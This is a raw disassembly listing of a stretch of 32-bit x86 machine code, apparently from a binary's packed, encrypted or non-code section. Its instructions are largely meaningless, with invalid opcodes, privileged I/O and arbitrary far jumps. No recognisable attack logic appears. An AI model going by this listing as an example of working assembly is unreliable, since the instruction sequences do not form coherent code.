  40d0cb:	fisubr DWORD PTR [esi-0x4e]
  40d0ce:	add    dl,BYTE PTR [edi+0x6ad494a5]
  40d0d4:	or     eax,0x8652a54a
  40d0d9:	test   al,0x5c
  40d0db:	or     ebx,0xffffffc8
  40d0de:	(bad)  
  40d0df:	xor    bh,BYTE PTR [ebx-0x7c]
  40d0e2:	sbb    eax,DWORD PTR [ebx+edx*4]
  40d0e5:	test   DWORD PTR [esi-0x1a],eax
  40d0e8:	mov    bh,0x68
  40d0ea:	cmp    ebp,DWORD PTR [eax-0x6ebae73f]
  40d0f0:	std    
  40d0f1:	sub    ebp,DWORD PTR [edx]
  40d0f3:	dec    eax
  40d0f4:	mov    cl,0xd3
  40d0f6:	xor    eax,0xc6a5d68a
  40d0fb:	jecxz  0x40d100
  40d0fd:	std    
  40d0fe:	adc    DWORD PTR [esp+eax*2],edx
  40d101:	aad    0x29
  40d103:	scas   eax,DWORD PTR es:[edi]
  40d104:	je     0x40d13a
  40d106:	jecxz  0x40d0fa
  40d108:	mov    ecx,0xc8ca880e
  40d10d:	inc    edi
  40d10e:	push   edi
  40d10f:	iret   
  40d110:	mov    ds:0x26c98090,eax
  40d115:	jmp    0x40d0ed
  40d117:	add    esi,DWORD PTR [eax+0x4c07c67f]
  40d11d:	dec    edx
  40d11e:	int3   
  40d11f:	es aas 
  40d121:	jl     0x40d145
  40d123:	adc    ecx,DWORD PTR [ebx-0x4]
  40d126:	pushw  es
  40d128:	mov    eax,ds:0xcc9897dd
  40d12d:	mov    ch,0xe9
  40d12f:	div    BYTE PTR [edx+esi*8]
  40d132:	into   
  40d133:	push   ecx
  40d134:	and    eax,0xc1084246
  40d139:	dec    esi
  40d13a:	jnp    0x40d171
  40d13c:	sti    
  40d13d:	lods   al,BYTE PTR ds:[esi]
  40d13e:	or     DWORD PTR [ecx-0x74],esi
  40d141:	addr16 pop esi
  40d143:	test   al,0xf2
  40d145:	(bad)  
  40d146:	dec    cl
  40d148:	out    dx,eax
  40d149:	push   edx
  40d14a:	test   eax,0x999999d4
  40d14f:	mov    cl,0x73
  40d151:	xor    edx,DWORD PTR [edx+0x59c6b124]
  40d157:	add    edx,ecx
  40d159:	frstor [ebp-0x6d]
  40d15c:	rol    esi,1
  40d15e:	hlt    
  40d15f:	jge    0x40d118
  40d161:	(bad)  [ebp+0x7e]
  40d164:	jle    0x40d104
  40d166:	push   0xffffffb5
  40d168:	into   
  40d169:	das    
  40d16a:	(bad)  
  40d16b:	ficom  DWORD PTR [edi+0x59]
  40d16e:	mov    esi,0xa93783e8
  40d173:	sbb    BYTE PTR [eax+0x49e7e928],al
  40d179:	push   edx
  40d17a:	jmp    0xe3d8152a
  40d17f:	cmp    BYTE PTR [ecx],ah
  40d181:	xchg   ebx,eax
  40d182:	mov    eax,ds:0xf8b93637
  40d187:	arpl   bx,di
  40d189:	pop    esi
  40d18a:	shr    DWORD PTR ss:[esi+0x271bd4ce],cl
  40d191:	or     DWORD PTR [ecx],ecx
  40d193:	xchg   edx,eax
  40d194:	pop    eax
  40d195:	dec    edx
  40d196:	bound  ebx,QWORD PTR [ecx-0x6d8a018]
  40d19c:	xchg   ch,ch
  40d19e:	lahf   
  40d19f:	jl     0x40d20e
  40d1a1:	xchg   BYTE PTR [ebp+edx*8+0x5c],al
  40d1a5:	mov    bl,dl
  40d1a7:	mov    esi,0x9bf6734c
  40d1ac:	test   eax,0x23ab52bb
  40d1b1:	into   
  40d1b2:	xor    esi,ecx
  40d1b4:	mov    ch,0xd4
  40d1b6:	ja     0x40d14a
  40d1b8:	fnstcw WORD PTR [ebp+0x3a]
  40d1bb:	shl    DWORD PTR [eax+0x3afacb34],cl
  40d1c1:	retf   0xa9cd
  40d1c4:	scas   al,BYTE PTR es:[edi]
  40d1c5:	sub    esp,DWORD PTR [edi+ecx*1+0x4f]
  40d1c9:	enter  0x6a0c,0x73
  40d1cd:	fwait
  40d1ce:	leave  
  40d1cf:	mov    eax,ds:0xbc1083b1
  40d1d4:	in     eax,0xe5
  40d1d6:	shl    bl,0x6d
  40d1d9:	aaa    
  40d1da:	or     BYTE PTR [eax-0x7efbdada],ah
  40d1e0:	scas   eax,DWORD PTR es:[edi]
  40d1e1:	imul   eax,DWORD PTR [ebx],0x1a
  40d1e4:	add    dh,bh
  40d1e6:	xor    al,0x2
  40d1e8:	push   eax
  40d1e9:	cmc    
  40d1ea:	repnz xchg edx,eax
  40d1ec:	inc    esp
  40d1ed:	sbb    DWORD PTR [edx],eax
  40d1ef:	push   ebx
  40d1f0:	adc    eax,0xddb52b20
  40d1f5:	mov    edi,0xccfa18dd
  40d1fa:	mov    edx,0x144133f9
  40d1ff:	stc    
  40d200:	jnp    0x40d216
  40d202:	jo     0x40d1d9
  40d204:	xchg   ecx,eax
  40d205:	jmp    0x40d19f
  40d207:	ins    DWORD PTR es:[edi],dx
  40d208:	std    
  40d209:	jle    0x40d24a
  40d20b:	xchg   ebp,eax
  40d20c:	jo     0x40d208
  40d20e:	mov    edx,0x890952e5
  40d213:	loopne 0x40d211
  40d215:	test   DWORD PTR [esi],ecx
  40d217:	mov    BYTE PTR [edx],bh
  40d219:	pop    ecx
  40d21a:	mov    ebp,0xc344b54f
  40d21f:	(bad)  
  40d220:	sub    BYTE PTR [edx-0x666afce8],dl
  40d226:	add    al,0x95
  40d228:	inc    edx
  40d229:	jp     0x40d220
  40d22b:	fisttp WORD PTR [esi+0x30]
  40d22e:	pop    edi
  40d22f:	dec    edx
  40d230:	jnp    0x40d1c6
  40d232:	and    eax,0x32faf480
  40d237:	jae    0x40d1c5
  40d239:	dec    ebx
  40d23a:	jecxz  0x40d215
  40d23c:	pop    es
  40d23d:	mov    DWORD PTR [ebp+0x32d07b],edx
  40d243:	ins    DWORD PTR es:[edi],dx
  40d244:	pop    es
  40d245:	mov    al,0xd7
  40d247:	cmp    dh,BYTE PTR ss:[ecx]
  40d24a:	and    al,0x4c
  40d24c:	repnz lds edi,FWORD PTR [edi]
  40d24f:	pop    ebp
  40d250:	jecxz  0x40d219
  40d252:	(bad)  
  40d253:	aad    0xef
  40d255:	repz (bad) 
  40d257:	jmp    ecx
  40d259:	ja     0x40d22b
  40d25b:	in     eax,dx
  40d25c:	jbe    0x40d2b7
  40d25e:	pop    ebx
  40d25f:	pop    ebx
  40d260:	mov    ds:0x308f2e5c,eax
  40d265:	dec    ecx
  40d266:	push   edi
  40d267:	sbb    eax,0x60c01170
  40d26c:	xor    BYTE PTR [eax-0xf8cd1a4],ah
  40d272:	loopne 0x40d2b5
  40d274:	repz fldenv ds:[edi+0x78]
  40d279:	in     al,0xcb
  40d27b:	xchg   edi,eax
  40d27c:	mov    BYTE PTR [edx-0x74085afb],dl
  40d282:	sbb    bl,BYTE PTR [ecx-0x23]
  40d285:	pop    edx
  40d286:	cmc    
  40d287:	mov    edx,DWORD PTR [edx+ebp*1-0x6405dd31]
  40d28e:	lds    edx,FWORD PTR [ecx-0x43903bb0]
  40d294:	call   0xef57:0x39af8336
  40d29b:	adc    BYTE PTR [edx+0x1b],al
  40d29e:	gs popf 
  40d2a0:	retf   
  40d2a1:	fidivr DWORD PTR [esi+0x5c392936]
  40d2a7:	fcomp  DWORD PTR [esi+0x17d08a2]
  40d2ad:	sti    
  40d2ae:	out    dx,al
  40d2af:	(bad)  
  40d2b0:	push   ss
  40d2b1:	xchg   ebp,eax
  40d2b2:	in     al,0x5c
  40d2b4:	add    BYTE PTR [edx+0x23],0xa7
  40d2b8:	(bad)  
  40d2b9:	fldenv [esi-0x2]
  40d2bc:	das    
  40d2bd:	mov    esi,0x1d0ff98e
  40d2c2:	xlat   BYTE PTR ds:[ebx]
  40d2c3:	nop
  40d2c4:	jp     0x40d2c7
  40d2c6:	loop   0x40d310
  40d2c8:	adc    al,BYTE PTR [edi+0x43133331]
  40d2ce:	add    bl,BYTE PTR [edi+0x31]
  40d2d1:	call   0xec95:0x2a53e122
  40d2d8:	xor    al,0xeb
  40d2da:	add    bh,BYTE PTR [ebx-0x29]
  40d2dd:	out    0xc8,al
  40d2df:	aaa    
  40d2e0:	mov    esi,0xa626edc5
  40d2e5:	add    ecx,DWORD PTR [ebx]
  40d2e7:	cmp    al,0xcf
  40d2e9:	mov    bh,0x7a
  40d2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ec:	jmp    0x40d2b0
  40d2ee:	push   ecx
  40d2ef:	cmc    
  40d2f0:	add    dl,bl
  40d2f2:	(bad)  
  40d2f3:	push   esp
  40d2f4:	fnsave fs:[edi-0x5f]
  40d2f8:	out    0xf5,al
  40d2fa:	or     al,0x7e
  40d2fc:	out    0x1c,al
  40d2fe:	pop    ss
  40d2ff:	ds cdq 
  40d301:	ins    DWORD PTR es:[edi],dx
  40d302:	out    dx,al
  40d303:	cmc    
  40d304:	fsubr  st(6),st
  40d306:	sbb    dl,BYTE PTR [ebx]
  40d308:	(bad)  
  40d30a:	mov    ss,WORD PTR [bp+di]
  40d30d:	retf   0x67dd
  40d310:	mov    ah,BYTE PTR [edi+0x78]
  40d313:	jno    0x40d2a1
  40d315:	adc    al,0x6a
  40d317:	pop    esi
  40d318:	inc    eax
  40d319:	lods   eax,DWORD PTR ds:[esi]
  40d31a:	pop    esi
  40d31b:	mov    ds:0xbeb01ddb,eax
  40d320:	mov    ?,WORD PTR [esi+0x7273174e]
  40d326:	inc    ebp
  40d327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d328:	test   eax,0x8613c9fb
  40d32d:	pusha  
  40d32e:	shl    bh,cl
  40d330:	xchg   BYTE PTR [edx],ah
  40d332:	mov    ds:0xa5e347cf,al
  40d337:	mov    edi,0xc3b35479
  40d33c:	aam    0x89
  40d33e:	fadd   QWORD PTR [ebx+0x553d59c4]
  40d344:	and    al,0x19
  40d346:	sbb    eax,0x82790539
  40d34b:	sub    BYTE PTR [ecx+0x733e77e6],bl
  40d351:	test   ecx,ebx
  40d353:	fxch   st(7)
  40d355:	repz aaa 
  40d357:	inc    edi
  40d359:	ja     0x40d32c
  40d35b:	outs   dx,BYTE PTR ds:[esi]
  40d35c:	mov    bh,0xe9
  40d35e:	je     0x40d39a
  40d360:	aam    0x6a
  40d362:	mov    ch,0x11
  40d364:	mov    ebp,0xc8193f3f
  40d369:	and    BYTE PTR [ebp-0x64411045],al
  40d36f:	or     edx,DWORD PTR [edi+0x4ff5f8b6]
  40d375:	cmp    eax,0x9a776c3
  40d37a:	mov    ds:0x63a519a1,al
  40d37f:	xor    BYTE PTR [ebx],0x2f
  40d382:	xchg   esp,eax
  40d383:	dec    eax
  40d384:	pop    ebp
  40d385:	sti    
  40d386:	push   esp
  40d387:	or     DWORD PTR [esi+0x28a720d8],eax
  40d38d:	not    BYTE PTR es:[eax+0xe]
  40d391:	or     al,0xd5
  40d393:	jnp    0x40d38b
  40d395:	sbb    DWORD PTR ds:0xc6e3a731,ecx
  40d39b:	xor    DWORD PTR [edx+eiz*2-0x55e98220],esi
  40d3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3a3:	jecxz  0x40d332
  40d3a5:	int3   
  40d3a6:	mov    cl,0xe9
  40d3a8:	mov    esi,0x96dabaec
  40d3ad:	push   ebp
  40d3ae:	xor    esi,DWORD PTR [edx]
  40d3b0:	jp     0x40d371
  40d3b2:	jp     0x40d335
  40d3b4:	int3   
  40d3b5:	push   cs
  40d3b6:	stos   DWORD PTR es:[edi],eax
  40d3b7:	push   ebp
  40d3b8:	call   0x75865d2a
  40d3bd:	retf   0xafff
  40d3c0:	xchg   edx,eax
  40d3c1:	xor    esp,0x93677239
  40d3c7:	push   0xffffffb5
  40d3c9:	dec    esp
  40d3ca:	scas   eax,DWORD PTR es:[edi]
  40d3cb:	scas   eax,DWORD PTR es:[edi]
  40d3cc:	adc    ch,BYTE PTR [ecx+0x7a01f3e4]
  40d3d2:	sahf   
  40d3d3:	inc    edi
  40d3d4:	stos   DWORD PTR es:[edi],eax
  40d3d5:	aad    0x1a
  40d3d7:	jno    0x40d3da
  40d3d9:	jmp    0xdbab:0x70df91b6
  40d3e0:	dec    ebp
  40d3e1:	add    eax,0x4185a502
  40d3e6:	add    al,0x2e
  40d3e8:	or     eax,0xc698292b
  40d3ed:	test   al,0x1b
  40d3ef:	into   
  40d3f0:	imul   ebx,DWORD PTR [edx-0x6f],0x7
  40d3f4:	mov    al,ds:0x64ef6a48
  40d3f9:	fdiv   DWORD PTR [ebx-0x77]
  40d3fc:	mov    eax,0x6f3b088
  40d401:	sub    al,0x17
  40d403:	and    DWORD PTR [eax+0x3601061e],edi
  40d409:	push   fs
  40d40b:	jno    0x40d410
  40d40d:	or     cl,bh
  40d40f:	and    ecx,DWORD PTR [edx+0x3a8dea63]
  40d415:	fucomp st(6)
  40d417:	nop
  40d418:	outs   dx,BYTE PTR ds:[esi]
  40d419:	mov    edi,0xd3ff085a
  40d41e:	addr16 push edx
  40d420:	nop
  40d421:	dec    edi
  40d422:	lds    ebp,FWORD PTR [eax-0xeb0b785]
  40d428:	mov    edi,DWORD PTR [ebx+edi*8-0x76190332]
  40d42f:	fist   DWORD PTR [ebp-0x21028616]
  40d435:	cmp    eax,0xa99a86f7
  40d43a:	in     al,dx
  40d43b:	arpl   WORD PTR [ebx],di
  40d43d:	add    ch,BYTE PTR [edi+esi*2+0x501de300]
  40d444:	(bad)  
  40d445:	or     al,0xe3
  40d447:	pop    ecx
  40d448:	jle    0x40d433
  40d44a:	aas    
  40d44b:	lahf   
  40d44c:	in     eax,0xce
  40d44e:	cmp    ebx,DWORD PTR [esi-0x4090621b]
  40d454:	xchg   DWORD PTR [edi],esp
  40d456:	lahf   
  40d457:	jl     0x40d3eb
  40d459:	outs   dx,BYTE PTR ds:[esi]
  40d45a:	mov    bh,0x4b
  40d45c:	test   eax,0x2831da54
  40d461:	dec    eax
  40d462:	dec    edx
  40d463:	adc    eax,0x3f3f33f0
  40d468:	iret   
  40d469:	(bad)  
  40d46a:	les    esp,FWORD PTR [edi+edi*8]
  40d46d:	idiv   bh
  40d46f:	(bad)  
  40d470:	pop    ebp
  40d471:	mov    ?,WORD PTR [ebp+0x57b2403c]
  40d477:	pop    es
  40d478:	std    
  40d479:	mov    eax,0x3cd8815
  40d47e:	sbb    BYTE PTR [eax],ah
  40d480:	xchg   edx,eax
  40d481:	call   0x495ef820
  40d486:	in     al,dx
  40d487:	pop    ecx
  40d488:	push   ebp
  40d489:	mov    DWORD PTR es:[ebx],edx
  40d48c:	push   esp
  40d48d:	outs   dx,DWORD PTR ds:[esi]
  40d48e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d48f:	jbe    0x40d4b4
  40d491:	push   ebx
  40d492:	sub    DWORD PTR [ecx],edi
  40d494:	sbb    eax,0x445b0213
  40d499:	push   ebp
  40d49a:	test   al,0x80
  40d49c:	pop    ds
  40d49d:	imul   esi,esp,0xef8e8cf5
  40d4a3:	push   ds
  40d4a4:	outs   dx,DWORD PTR ds:[esi]
  40d4a5:	rol    BYTE PTR [eax-0x66f6a3df],1
  40d4ab:	mov    al,ds:0xe0d6d722
  40d4b0:	jle    0x40d512
  40d4b2:	loope  0x40d4cc
  40d4b4:	push   cs
  40d4b5:	xor    ebx,DWORD PTR [ebp+0x199aaeab]
  40d4bb:	mov    ds:0x155a2412,eax
  40d4c0:	push   ecx
  40d4c1:	adc    eax,DWORD PTR [edx+0x789204e2]
  40d4c7:	rcl    ah,0x44
  40d4ca:	pusha  
  40d4cb:	(bad)  
  40d4cc:	mov    eax,ds:0xc66d861b
  40d4d1:	stos   DWORD PTR es:[edi],eax
  40d4d2:	stos   DWORD PTR es:[edi],eax
  40d4d3:	ds out 0x9b,eax
  40d4d6:	adc    dl,ah
  40d4d8:	mov    dh,0x94
  40d4da:	add    esi,DWORD PTR [ebx-0x25]
  40d4dd:	dec    ebp
  40d4de:	mov    edx,0xcbf9dd01
  40d4e3:	(bad)  
  40d4e4:	in     al,0x98
  40d4e6:	in     al,dx
  40d4e7:	jb     0x40d53f
  40d4e9:	add    eax,0xf29a1bc8
  40d4ee:	sub    BYTE PTR [eax-0x49],ah
  40d4f1:	mov    esi,0x1d15b77c
  40d4f6:	jecxz  0x40d546
  40d4f8:	lea    esi,[ebp+0x19]
  40d4fb:	sub    DWORD PTR [ecx+0x10e8400],0x4c8c7116
  40d505:	adc    ch,dl
  40d507:	mov    ch,0x1a
  40d509:	pop    ebx
  40d50a:	popf   
  40d50b:	nop
  40d50c:	pop    esi
  40d50d:	mov    edi,0xd7d4ea94
  40d512:	push   0x69034066
  40d517:	jp     0x40d516
  40d519:	sbb    eax,0xbafd5b88
  40d51e:	les    ebp,FWORD PTR ds:0x29b8732d
  40d524:	ret    0x3ccf
  40d527:	dec    eax
  40d528:	add    al,dl
  40d52a:	push   ebp
  40d52b:	pop    es
  40d52c:	shl    BYTE PTR [ecx+edi*4],0xcc
  40d530:	push   ss
  40d531:	cld    
  40d532:	adc    BYTE PTR [ebx+edi*2-0x403b038d],dh
  40d539:	jle    0x40d4bd
  40d53b:	add    edi,ebx
  40d53d:	div    DWORD PTR [eax-0x21]
  40d540:	jge    0x40d539
  40d542:	icebp  
  40d543:	in     al,0x93
  40d545:	dec    edi
  40d546:	adc    al,BYTE PTR [ebp-0x6f]
  40d549:	or     eax,0xa77fca88
  40d54e:	loope  0x40d5c0
  40d550:	dec    eax
  40d551:	test   eax,0xa1d0e254
  40d556:	cmp    edi,eax
  40d558:	mov    ebp,0xe7c53ccf
  40d55d:	mov    esi,0xd9289178
  40d562:	add    edi,DWORD PTR [esi+0x53]
  40d565:	(bad)  [ecx+0x24]
  40d568:	fs dec ebx
  40d56a:	mov    DWORD PTR [ebx+0x49df4807],ebx
  40d570:	push   0xffffffc6
  40d572:	sbb    al,0x27
  40d574:	sahf   
  40d575:	(bad)  
  40d576:	mov    ebx,0xc55488d
  40d57b:	aam    0x58
  40d57d:	clc    
  40d57e:	test   eax,edx
  40d580:	sahf   
  40d581:	and    al,0xe9
  40d583:	mov    gs,WORD PTR ds:0x9e44263d
  40d589:	lock push ebp
  40d58b:	lods   eax,DWORD PTR ds:[esi]
  40d58c:	push   es
  40d58d:	popa   
  40d58e:	sbb    DWORD PTR [edi-0x2f4afb35],ebp
  40d594:	add    ch,cl
  40d596:	adc    ah,dh
  40d598:	sti    
  40d599:	or     BYTE PTR [ecx-0x1744f67a],dl
  40d59f:	outs   dx,BYTE PTR ds:[esi]
  40d5a0:	pop    es
  40d5a1:	cmc    
  40d5a2:	xor    DWORD PTR [ebp+0x7],edx
  40d5a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5a6:	sti    
  40d5a7:	dec    edx
  40d5a8:	push   esi
  40d5a9:	cli    
  40d5aa:	mov    ebx,0x39130af5
  40d5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5b0:	push   edx
  40d5b1:	icebp  
  40d5b2:	inc    esi
  40d5b3:	mov    esi,0x529659b9
  40d5b8:	inc    ebp
  40d5b9:	cdq    
  40d5ba:	push   ss
  40d5bb:	inc    ebp
  40d5bc:	add    dl,ch
  40d5be:	cmc    
  40d5bf:	fucomi st,st(2)
  40d5c1:	add    al,BYTE PTR [ebx+ebx*4-0x11cbfb74]
  40d5c8:	cmp    eax,0xaccc40e1
  40d5cd:	xchg   esp,eax
  40d5ce:	push   ebp
  40d5cf:	popf   
  40d5d0:	out    dx,eax
  40d5d1:	sti    
  40d5d2:	pop    esi
  40d5d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5d4:	xor    BYTE PTR [eax+0x648cb83b],cl
  40d5da:	jbe    0x40d5b1
  40d5dc:	add    DWORD PTR [edi-0xb4d89ad],esi
  40d5e2:	out    dx,eax
  40d5e3:	mov    ah,0xe
  40d5e5:	mov    WORD PTR [eax-0x2a],?
  40d5e8:	and    dl,BYTE PTR [ebp+0x28db42c1]
  40d5ee:	rcl    BYTE PTR [ebp-0x187bec83],cl
  40d5f4:	imul   eax,esp,0x358c682c
  40d5fa:	cmp    BYTE PTR [ecx+0x2f41857c],bh
  40d600:	inc    eax
  40d601:	jmp    0x1804bca9
  40d606:	sub    esp,edx
  40d608:	xor    al,BYTE PTR [ecx+0x23a01518]
  40d60e:	gs xchg esi,eax
  40d610:	cdq    
  40d611:	gs sub eax,0x7cbaa3ff
  40d617:	jbe    0x40d599
  40d619:	pop    esp
  40d61a:	mov    ds:0xd9b46ff3,eax
  40d61f:	repnz fiadd WORD PTR ds:0x4cb0136
  40d626:	and    al,0xe0
  40d628:	mov    bl,0xb2
  40d62a:	ss ret 
  40d62c:	daa    
  40d62d:	jg     0x40d623
  40d62f:	repz cld 
  40d631:	aas    
  40d632:	aas    
  40d633:	mul    DWORD PTR [ecx+0x1e]
  40d636:	jl     0x40d628
  40d638:	inc    ecx
  40d639:	sahf   
  40d63a:	js     0x40d61e
  40d63c:	or     DWORD PTR [esi],eax
  40d63e:	add    DWORD PTR [ecx],0xffffffb5
  40d641:	pop    edx
  40d642:	or     eax,0x3094d548
  40d647:	or     al,0x19
  40d649:	push   cs
  40d64a:	xchg   esp,ebx
  40d64c:	jae    0x40d61d
  40d64e:	cmp    eax,0xceb73d9c
  40d653:	scas   eax,DWORD PTR es:[edi]
  40d654:	inc    dh
  40d656:	xchg   ebx,eax
  40d657:	ins    BYTE PTR es:[edi],dx
  40d658:	mov    bh,0x1b
  40d65a:	and    BYTE PTR [edx-0x40ecb2c0],bl
  40d660:	jle    0x40d613
  40d662:	mov    esp,0x886ad554
  40d667:	and    dl,BYTE PTR [esi]
  40d669:	in     eax,0x16
  40d66b:	push   esp
  40d66c:	add    BYTE PTR ss:[ecx-0x1c],al
  40d670:	or     DWORD PTR [edx],eax
  40d672:	popf   
  40d673:	xor    ecx,edi
  40d675:	popw   es
  40d677:	adc    al,BYTE PTR [edx]
  40d679:	xor    dl,al
  40d67b:	cmp    al,0x15
  40d67d:	and    BYTE PTR [esi-0x2ce95aa0],al
  40d683:	mov    dh,al
  40d685:	lea    eax,[ebp+0x4ba3c4de]
  40d68b:	jnp    0x40d709
  40d68d:	inc    esi
  40d68e:	pop    esi
  40d68f:	cmp    ebp,ebx
  40d691:	(bad)  
  40d692:	fistp  WORD PTR [edi-0x18]
  40d695:	gs sub al,bl
  40d698:	outs   dx,BYTE PTR ds:[esi]
  40d699:	lahf   
  40d69a:	inc    edi
  40d69b:	fs pop edi
  40d69d:	sub    eax,0xcf4d0231
  40d6a2:	add    al,0xc
  40d6a4:	mov    eax,ds:0xebb98b59
  40d6a9:	loopne 0x40d6e3
  40d6ab:	and    DWORD PTR [ecx-0x4f],0x7
  40d6af:	sar    BYTE PTR [edi+ebp*2+0x33],0x3f
  40d6b4:	and    edi,DWORD PTR [ebx+0x7f]
  40d6b7:	inc    edx
  40d6b8:	outs   dx,BYTE PTR ds:[esi]
  40d6b9:	push   ebx
  40d6ba:	cmp    eax,0x4ddb740
  40d6bf:	add    eax,DWORD PTR [eax]
  40d6c1:	iret   
  40d6c2:	or     esi,esp
  40d6c4:	push   esp
  40d6c5:	pusha  
  40d6c6:	ja     0x40d6f6
  40d6c8:	and    BYTE PTR [ecx+0xe],0xa9
  40d6cc:	push   ds
  40d6cd:	lods   al,BYTE PTR ds:[esi]
  40d6ce:	out    0x2,al
  40d6d0:	push   esp
  40d6d1:	in     eax,dx
  40d6d2:	jle    0x40d6ab
  40d6d4:	rcl    BYTE PTR [edi+edx*4-0xccf7902],0x2a
  40d6dc:	or     DWORD PTR [ebx-0x14],0xb7770279
  40d6e3:	out    0x91,eax
  40d6e5:	ret    
  40d6e6:	dec    esi
  40d6e7:	(bad)  
  40d6e8:	or     ah,BYTE PTR [ecx]
  40d6ea:	adc    BYTE PTR [esi+0x1bf9f2a7],bl
  40d6f0:	enter  0x7fab,0x7d
  40d6f4:	fbld   TBYTE PTR [edi+0x72]
  40d6f7:	jb     0x40d683
  40d6f9:	int    0xcd
  40d6fb:	out    0x29,eax
  40d6fd:	jns    0x40d746
  40d6ff:	dec    ecx
  40d700:	les    edi,FWORD PTR [esi]
  40d702:	bound  esp,QWORD PTR [esi-0x69bea9c0]
  40d708:	rcl    BYTE PTR [edi-0x1938a5e6],0xa2
  40d70f:	dec    eax
  40d710:	or     esi,DWORD PTR [ecx-0x6b]
  40d713:	xor    eax,0xdc408b39
  40d718:	sti    
  40d719:	out    0xa5,al
  40d71b:	jmp    FWORD PTR ds:0x25db5268
  40d721:	inc    esi
  40d722:	cwde   
  40d723:	or     BYTE PTR [eax-0x2b],0x1
  40d727:	or     ecx,edi
  40d729:	sub    ebx,DWORD PTR [edi+edi*1]
  40d72c:	push   ecx
  40d72d:	out    0xef,eax
  40d72f:	(bad)  
  40d730:	outs   dx,DWORD PTR ds:[esi]
  40d731:	mov    edi,0xf3fe4fc5
  40d736:	psllw  mm6,mm0
  40d739:	ret    
  40d73a:	psllq  mm3,mm4
  40d73d:	jae    0x40d70e
  40d73f:	jno    0x40d736
  40d741:	jmp    0x79e0:0x25cd2055
  40d748:	push   ds
  40d749:	ja     0x40d72a
  40d74b:	jge    0x40d784
  40d74d:	xor    esi,DWORD PTR [ebx]
  40d74f:	repz cld 
  40d751:	int3   
  40d752:	mov    edi,0x9c4e4dff
  40d757:	mov    ss,WORD PTR [ecx-0x2a5665e]
  40d75d:	push   ebp
  40d75e:	pop    es
  40d75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d760:	das    
  40d761:	push   0x5be8fdd
  40d766:	push   es
  40d767:	ror    BYTE PTR [ebx+0x74],cl
  40d76a:	sub    al,0x80
  40d76c:	sub    bl,BYTE PTR [ebx-0x6eceb8e3]
  40d772:	(bad)  
  40d773:	hlt    
  40d774:	sahf   
  40d775:	adc    al,0x8e
  40d777:	jle    0x40d7e6
  40d779:	into   
  40d77a:	aad    0x46
  40d77c:	push   ebp
  40d77d:	xchg   edi,eax
  40d77e:	clc    
  40d77f:	lods   al,BYTE PTR ds:[esi]
  40d780:	xchg   edx,eax
  40d781:	out    dx,al
  40d782:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d783:	mov    bh,0xb2
  40d785:	inc    ecx
  40d786:	aas    
  40d787:	imul   edi,DWORD PTR [ecx+ecx*4+0x2b],0x822af294
  40d78f:	add    al,BYTE PTR [edx]
  40d791:	mov    ?,esp
  40d793:	mov    bh,0xaa
  40d795:	cmp    bl,0x51
  40d798:	push   edx
  40d799:	fild   DWORD PTR [ebx+0x26]
  40d79c:	pop    ds
  40d79d:	mov    al,ds:0xa4fb2e7e
  40d7a2:	(bad)  
  40d7a3:	push   es
  40d7a4:	and    BYTE PTR [ebp+0x35],ch
  40d7a7:	mov    al,ds:0xbd98f189
  40d7ac:	repz or eax,0xf857b0a2
  40d7b2:	jns    0x40d740
  40d7b4:	shr    BYTE PTR [ebx-0x4b],0x5a
  40d7b8:	sbb    DWORD PTR [esp+ebp*4+0x156c045b],esp
  40d7bf:	sahf   
  40d7c0:	js     0x40d7cd
  40d7c2:	fisttp DWORD PTR [ebp+0x4c]
  40d7c5:	pop    es
  40d7c6:	div    BYTE PTR [esp+ecx*2]
  40d7c9:	xor    ebx,DWORD PTR [eax+edi*1-0x55]
  40d7cd:	inc    edi
  40d7ce:	(bad)  
  40d7cf:	jmp    0xef77:0x9e485955
  40d7d6:	in     eax,0xd
  40d7d8:	jne    0x40d840
  40d7da:	jg     0x40d7ed
  40d7dc:	and    dh,BYTE PTR [eax-0x51]
  40d7df:	jae    0x40d80e
  40d7e1:	clc    
  40d7e2:	lahf   
  40d7e3:	addr16 sbb cl,bh
  40d7e6:	jae    0x40d825
  40d7e8:	and    DWORD PTR [eax-0x15f5d55c],ecx
  40d7ee:	stc    
  40d7ef:	mov    esi,0x84920752
  40d7f4:	pop    edx
  40d7f5:	lods   eax,DWORD PTR ds:[esi]
  40d7f6:	inc    esi
  40d7f7:	pushf  
  40d7f8:	or     BYTE PTR [esi-0x203426e4],cl
  40d7fe:	stc    
  40d7ff:	fwait
  40d800:	sti    
  40d801:	pop    ecx
  40d802:	ds jnp 0x40d79e
  40d805:	in     eax,0xe5
  40d807:	jecxz  0x40d865
  40d809:	pop    edx
  40d80a:	test   eax,0xa355beb0
  40d80f:	aas    
  40d810:	pushf  
  40d811:	and    al,0xe
  40d813:	test   DWORD PTR [eax+0x4d2a26c],0x8240a7b
  40d81d:	nop
  40d81e:	xor    al,BYTE PTR [edx-0x6e]
  40d821:	and    BYTE PTR [edx-0x1c3176f8],dl
  40d827:	xchg   ebx,eax
  40d828:	xchg   ecx,eax
  40d829:	not    bh
  40d82b:	xor    BYTE PTR [eax],ch
  40d82d:	jl     0x40d852
  40d82f:	pop    ebx
  40d830:	and    DWORD PTR [ebx],edx
  40d832:	and    BYTE PTR [ebp+0x7],dl
  40d835:	nop
  40d836:	sbb    BYTE PTR [ebx-0x1c315b5f],ah
  40d83c:	dec    edi
  40d83d:	(bad)  
  40d83e:	jl     0x40d83c
  40d840:	scas   eax,DWORD PTR es:[edi]
  40d841:	(bad)  
  40d842:	sub    bl,bh
  40d844:	push   DWORD PTR [ecx+0x3f97f2d7]
  40d84a:	hlt    
  40d84b:	adc    BYTE PTR [ebp+0x572b874e],bl
  40d851:	scas   al,BYTE PTR es:[edi]
  40d852:	fdivr  DWORD PTR [ecx]
  40d854:	adc    dl,BYTE PTR [ebx+0x53]
  40d857:	push   ebx
  40d858:	js     0x40d8d8
  40d85a:	popf   
  40d85b:	lahf   
  40d85c:	sti    
  40d85d:	(bad)  
  40d85e:	lahf   
  40d85f:	in     eax,0x8f
  40d861:	pop    ds
  40d862:	cmp    DWORD PTR [edi-0x3e],ecx
